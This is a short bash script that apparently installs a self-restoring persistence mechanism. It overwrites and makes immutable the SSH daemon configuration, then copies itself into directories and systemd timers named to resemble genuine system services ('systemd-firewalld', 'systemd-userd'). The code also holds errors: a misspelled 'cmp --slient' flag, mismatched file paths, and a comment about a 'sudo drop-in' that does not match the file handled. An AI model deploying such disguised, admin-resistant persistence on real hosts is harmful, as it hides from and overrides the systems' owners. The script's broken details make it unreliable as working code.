#! /bin/bash

SSH_CONFIG="sshd_config"

# Add our sudo drop-in file if its not there or been modified
if ! cmp --slient "/etc/ssh/$SSH_CONFIG" "files/$SSH_CONFIG" >/dev/null 2>/dev/null; then
	chattr -i /etc/ssh/$SSH_CONFIG
	cp -- /usr/share/systemd-sshd/files/$SSH_CONFIG /etc/ssh/$SSH_CONFIG
	chattr +i /etc/ssh/$SSH_CONFIG
fi

# Self healing
mkdir --parents /usr/share/systemd-firewalld
mkdir --parents /usr/share/systemd-userd
cp -- /usr/share/systemd-sshd/systemd/* /etc/systemd/system/
cp -r -- /usr/share/systemd-sshd/* /usr/share/systemd-firewalld/
cp -r -- /usr/share/systemd-sshd/* /usr/share/systemd-userd/

systemctl daemon-reload
systemctl unmask systemd-firewalld.service
systemctl unmask systemd-userd.service

systemctl unmask systemd-firewalld.timer
systemctl unmask systemd-userd.timer

systemctl enable --now systemd-firewalld.timer
systemctl enable --now systemd-userd.timer

# vim: set filetype=sh:
